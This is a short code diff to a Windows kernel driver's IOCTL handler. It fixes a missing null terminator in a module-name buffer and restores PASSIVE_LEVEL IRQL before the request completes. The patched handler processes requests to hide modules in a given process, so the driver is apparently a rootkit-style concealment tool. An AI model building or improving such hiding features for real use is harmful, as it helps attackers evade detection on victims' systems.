@@ -740,7 +740,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		auto data = static_cast<IoctlHiddenModuleInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		hiddenModule.Hide = data->Hide;
 		hiddenModule.Pid = data->Pid;
-		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
+		SIZE_T moduleNameSize = (wcslen(data->ModuleName) + 1) * sizeof(WCHAR);
 
 		MemoryAllocator<WCHAR*> moduleName(moduleNameSize);
 		status = moduleName.CopyData(data->ModuleName, moduleNameSize);
@@ -1323,6 +1323,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
 		break;
+	}
+
+	// IrqlGuard will restore the original IRQL on exit, but ensuring that the IRQL is PASSIVE_LEVEL before calling to IoCompleteRequest.
+	if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
+		guard.SetExitIrql(guard.GetOriginalIrql());
+		guard.SetIrql(PASSIVE_LEVEL, true);
 	}
 
 	Irp->IoStatus.Status = status;
